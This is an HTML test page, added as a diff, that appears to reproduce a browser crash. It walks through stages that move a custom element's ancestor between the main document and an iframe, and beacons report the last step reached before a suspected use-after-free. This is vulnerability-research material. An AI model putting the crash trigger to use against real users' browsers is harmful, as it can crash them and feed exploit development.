@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1273</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+.hdr{color:#ff0}
+.crash{color:#f44}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+// Synchronous beacon — flushes BEFORE the next line runs, so a crash on the
+// next line is detectable as "this beacon arrived but the next did not".
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1273-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,500));
+    u+='&t='+(window.__seq=(window.__seq||0)+1);
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1273: ADOPTNODE/CE CRASH — REPRODUCER + STEP LOCATOR ===');
+log('Locked boundary: adopt ancestor to LIVE iframe + append to iframe body + restore,');
+log('inside a synchronous custom-element connectedCallback.');
+log('Key question: does ONE clean dance crash (UAF), or only re-entrancy (stack)?');
+B('START','P1273');
+
+function makeIframe(){
+  var ifr=document.createElement('iframe');
+  ifr.style.cssText='width:1px;height:1px;position:absolute;left:-9999px';
+  document.body.appendChild(ifr);
+  ifr.contentDocument.open();
+  ifr.contentDocument.write('<html><body></body></html>');
+  ifr.contentDocument.close();
+  return ifr;
+}
+
+// Build a fresh (parent, custom-element, iframe) triple for one test.
+// The CE is appended to `parent` which is a direct child of body (matches P1271-B).
+function setup(ceName, cbFn){
+  customElements.define(ceName, class extends HTMLElement {
+    connectedCallback(){ cbFn(this); }
+  });
+  var parent=document.createElement('div');
+  parent.style.cssText='position:absolute;left:-9999px';
+  parent.innerHTML='<p>ancestor-content</p>';
+  document.body.appendChild(parent);
+  var ce=document.createElement(ceName);
+  ce.textContent='CE';
+  return {parent:parent, ce:ce, ifr:makeIframe()};
+}
+function cleanup(ctx){
+  try{ if(ctx.parent && ctx.parent.parentNode) ctx.parent.parentNode.removeChild(ctx.parent); }catch(e){}
+  try{ if(ctx.ifr && ctx.ifr.parentNode) ctx.ifr.parentNode.removeChild(ctx.ifr); }catch(e){}
+}
+</script>
+
+<!-- ============================================================= -->
+<!-- S0: FULL KILLER, ONE-SHOT (no re-entrancy), INTERNAL STEP BEACONS -->
+<!-- If this crashes, the crash is a CLEAN single dance = UAF signal, -->
+<!-- NOT stack overflow. The last beacon received = the fatal operation. -->
+<!-- ============================================================= -->
+<script>
+log('\n<span class="hdr">--- S0: one-shot full dance, internal step beacons ---</span>');
+(function(){
+  var ctx;
+  try{
+    var done=false;
+    ctx=setup('x-s0', function(self){
+      if(done){ B('S0-reentry','nested cc suppressed by one-shot guard'); return; }
+      done=true;
+      var p=self.parentNode;              // the ancestor (parent div)
+      B('S0-cc','entered callback; parent='+(p?p.nodeName:'null'));
+      if(!p){ B('S0-noparent','parent already null'); return; }
+      ctx2.ifr.contentDocument.adoptNode(p);
+      B('S0-adopted','adopted ancestor into iframe doc; next: append to iframe body');
+      ctx2.ifr.contentDocument.body.appendChild(p);
+      B('S0-appended','appended into iframe body; next: adopt back to main doc');
+      document.adoptNode(p);
+      B('S0-adoptback','adopted back to main doc; next: re-append to main body');
+      document.body.appendChild(p);
+      B('S0-restored','re-appended to main body; dance complete');
+    });
+    var ctx2=ctx;
+    B('S0-pre','about to insert CE (triggers the one-shot dance)');
+    ctx.parent.appendChild(ctx.ce);       // fires connectedCallback synchronously
+    B('S0-post','SURVIVED one-shot full dance');
+  }catch(e){ B('S0-err',e.name+':'+e.message.slice(0,120)); }
+  cleanup(ctx);
+})();
+</script>
+
+<!-- ============================================================= -->
+<!-- S1: adopt ancestor into iframe ONLY (no append, no restore).      -->
+<!-- P1272-G confirmed this SURVIVES. Baseline sanity check.           -->
+<!-- ============================================================= -->
+<script>
+log('\n<span class="hdr">--- S1: adopt-to-iframe only (expected survive) ---</span>');
+(function(){
+  var ctx;
+  try{
+    var done=false;
+    ctx=setup('x-s1', function(self){
+      if(done)return; done=true;
+      var p=self.parentNode; if(!p)return;
+      ctx2.ifr.contentDocument.adoptNode(p);
+    });
+    var ctx2=ctx;
+    B('S1-pre','adopt-to-iframe-only');
+    ctx.parent.appendChild(ctx.ce);
+    B('S1-post','SURVIVED|owner='+(ctx.parent.ownerDocument===document?'main':'iframe'));
+  }catch(e){ B('S1-err',e.name+':'+e.message.slice(0,120)); }
+  cleanup(ctx);
+})();
+</script>
+
+<!-- ============================================================= -->
+<!-- S2: adopt + append to iframe body, NO restore.                    -->
+<!-- Isolates whether INSERTION into the live frame is itself fatal.    -->
+<!-- ============================================================= -->
+<script>
+log('\n<span class="hdr">--- S2: adopt + append-to-iframe-body, no restore ---</span>');
+(function(){
+  var ctx;
+  try{
+    var done=false;
+    ctx=setup('x-s2', function(self){
+      if(done)return; done=true;
+      var p=self.parentNode; if(!p)return;
+      ctx2.ifr.contentDocument.adoptNode(p);
+      ctx2.ifr.contentDocument.body.appendChild(p);
+    });
+    var ctx2=ctx;
+    B('S2-pre','adopt + append-to-iframe-body, no restore');
+    ctx.parent.appendChild(ctx.ce);
+    B('S2-post','SURVIVED|owner='+(ctx.parent.ownerDocument===document?'main':'iframe'));
+  }catch(e){ B('S2-err',e.name+':'+e.message.slice(0,120)); }
+  cleanup(ctx);
+})();
+</script>
+
+<!-- ============================================================= -->
+<!-- S3: adopt + append to iframe body + adopt back, NO re-append.      -->
+<!-- Isolates whether the adopt-BACK (document change #2) is fatal.      -->
+<!-- ============================================================= -->
+<script>
+log('\n<span class="hdr">--- S3: adopt + append + adopt-back, no re-append ---</span>');
+(function(){
+  var ctx;
+  try{
+    var done=false;
+    ctx=setup('x-s3', function(self){
+      if(done)return; done=true;
+      var p=self.parentNode; if(!p)return;
+      ctx2.ifr.contentDocument.adoptNode(p);
+      ctx2.ifr.contentDocument.body.appendChild(p);
+      document.adoptNode(p);              // adopt back but do NOT re-append
+    });
+    var ctx2=ctx;
+    B('S3-pre','adopt + append + adopt-back, no re-append');
+    ctx.parent.appendChild(ctx.ce);
+    B('S3-post','SURVIVED|owner='+(ctx.parent.ownerDocument===document?'main':'iframe')+
+      '|in_dom='+document.body.contains(ctx.parent));
+  }catch(e){ B('S3-err',e.name+':'+e.message.slice(0,120)); }
+  cleanup(ctx);
+})();
+</script>
+
+<!-- ============================================================= -->
+<!-- S4: RE-ENTRANCY test. Un-guarded dance, depth-capped at 3.         -->
+<!-- If S0 (one-shot) survived but THIS crashes, re-entrancy is the     -->
+<!-- trigger. The last S4-depth beacon shows how deep it got.           -->
+<!-- ============================================================= -->
+<script>
+log('\n<span class="hdr">--- S4: un-guarded dance, depth-capped at 3 (re-entrancy test) ---</span>');
+(function(){
+  var ctx;
+  try{
+    var depth=0, CAP=3;
+    ctx=setup('x-s4', function(self){
+      depth++;
+      var d=depth;
+      B('S4-depth','enter depth='+d);
+      if(d>CAP){ B('S4-capped','depth cap reached, stopping recursion'); return; }
+      var p=self.parentNode; if(!p){ B('S4-noparent','d='+d); return; }
+      ctx2.ifr.contentDocument.adoptNode(p);
+      ctx2.ifr.contentDocument.body.appendChild(p);   // re-fires cc in iframe (nested)
+      document.adoptNode(p);
+      document.body.appendChild(p);                   // re-fires cc in main (nested)
+      B('S4-done','depth='+d+' dance complete');
+    });
+    var ctx2=ctx;
+    B('S4-pre','un-guarded dance, cap=3');
+    ctx.parent.appendChild(ctx.ce);
+    B('S4-post','SURVIVED|maxdepth-seen-in-beacons|in_dom='+document.body.contains(ctx.parent));
+  }catch(e){ B('S4-err',e.name+':'+e.message.slice(0,120)); }
+  cleanup(ctx);
+})();
+</script>
+
+<!-- ============================================================= -->
+<!-- S5: confirm classic P1271-B shape EXACTLY (un-guarded, uncapped    -->
+<!-- but with a hard safety cap of 50 to avoid infinite spam). This is  -->
+<!-- the original killer. Runs LAST so S0-S4 data is banked first.      -->
+<!-- ============================================================= -->
+<script>
+log('\n<span class="hdr">--- S5: original P1271-B shape (uncapped dance, safety 50) ---</span>');
+(function(){
+  var ctx;
+  try{
+    var n=0, SAFETY=50;
+    ctx=setup('x-s5', function(self){
+      n++;
+      if(n>SAFETY){ return; }
+      var p=self.parentNode; if(!p)return;
+      ctx2.ifr.contentDocument.adoptNode(p);
+      ctx2.ifr.contentDocument.body.appendChild(p);
+      document.adoptNode(p);
+      document.body.appendChild(p);
+    });
+    var ctx2=ctx;
+    B('S5-pre','original killer shape, safety=50');
+    ctx.parent.appendChild(ctx.ce);
+    B('S5-post','SURVIVED|iterations='+n+'|in_dom='+document.body.contains(ctx.parent));
+  }catch(e){ B('S5-err',e.name+':'+e.message.slice(0,120)); }
+  cleanup(ctx);
+})();
+</script>
+
+<script>
+setTimeout(function(){
+  B('DONE','all');
+  log('\n=== P1273 COMPLETE (if you see this, nothing crashed) ===');
+}, 3000);
+</script>
+
+</body>
+</html>
